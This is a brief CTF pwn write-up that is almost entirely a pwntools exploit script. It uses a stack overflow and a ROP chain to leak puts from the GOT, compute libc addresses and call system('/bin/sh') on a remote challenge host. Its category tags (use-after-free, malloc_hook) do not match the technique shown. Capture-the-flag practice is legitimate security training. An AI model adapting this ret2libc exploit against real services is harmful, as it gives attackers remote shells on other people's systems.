---
title: '{文件名}'
date: 2024-11-11 13:00:00 +0800
categories: [uaf,malloc_hook,unsortbin_leaklibc]
tags: [ctf,pwn]
---
```python
from pwn import *
#context.log_level='debug'
Lib = ELF('./glibc/libc.so.6')
elf = ELF('./rocket_blaster_xxx')
#io = process('./rocket_blaster_xxx')
io = remote('83.136.254.221',56354)
#io = gdb.debug('./rocket_blaster_xxx')

padding = 40
pop_rdi = 0x000000000040159f #: pop rdi ; ret

payload = b'A'*padding+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(elf.sym['main'])
io.sendlineafter(b'>>',payload)
#leak libc_puts_addr
io.recvuntil(b'Preparing beta testing..\n')
puts_addr = u64(io.recv(6).ljust(8,b'\x00'))
print('addr => ',hex(puts_addr))
#symbol_addr from glibc by gdb
base_offset = puts_addr - 0x5555555d4e50
system_addr = base_offset + 0x5555555a4d70
bin_sh_addr = base_offset + 0x55555572c678
print('/bin/sh_addr=>',hex(bin_sh_addr))
#pause()
payload1 = b'A'*padding+p64(pop_rdi)+p64(bin_sh_addr)+p64(0x000000000040101a)+p64(system_addr)
#cause higher version glibc use `xmm`,so we should make Stack balancing by `ret`(0x000000000040101a :ret)

io.sendlineafter(b'>>',payload1)

io.interactive()
```

common leak libc

